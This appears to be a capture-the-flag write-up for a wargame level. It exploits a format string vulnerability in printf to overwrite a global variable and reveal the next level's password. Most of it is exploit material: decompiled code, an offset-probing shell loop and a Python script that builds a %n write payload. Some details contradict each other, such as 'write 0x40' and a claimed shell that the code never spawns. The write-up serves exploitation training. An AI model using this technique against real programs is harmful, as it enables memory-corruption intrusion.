<h1 align="center"> LEVEL 4 </h1>

## 🔍 Analysis of Decompiled [level4](./source.c)
The target is a vulnerable binary named `level4`. Our goal is to:

- Exploit a **format string vulnerability** in `printf()`
- Overwrite a global variable `m` with the value `0x1025544`
- Satisfy the condition `if (m == 0x1025544)` to execute ` system("/bin/cat /home/user/level5/.pass")`


### 🔐 Binary Protections

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4

void p(char *param_1)

{
  printf(param_1);
  return;
}

void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

```
## 💥 Exploit 

Leak stack contents to determine the correct format string offset
Use %n to write `0x40` to the address of the global variable m
Trigger the condition and gain a shell

###  Step 1: Find the Address of m

```sh
(gdb) p &m
$1 = (int *) 0x08049810
```
### Step 2: Discover Format String Offset

```sh
for i in $(seq 1 40); do
  python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level4
done
```
Look for `41414141` in the output. appears at `%11$x`, that means the offset is 11.
### Step 3: Exploit Script
```py
import struct
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <offset>")
    sys.exit(1)

offset = int(sys.argv[1])

m_addr = struct.pack("<I", 0x08049810)
target_val = 0x1025544
written = len(m_addr)

padding = target_val - written
if padding < 0:
    padding += 256

fmt = "%%%dx%%%d$n" % (padding, offset)
payload = m_addr + fmt.encode("ascii")

with open("payload.txt", "wb") as f:
    f.write(payload)

print("Wrote payload with offset %d" % offset)


```
### Step 4: Execute the Exploit
```
python exploit.py 11
(cat payload.txt; cat) | ./level4
$ whoami
level4
```
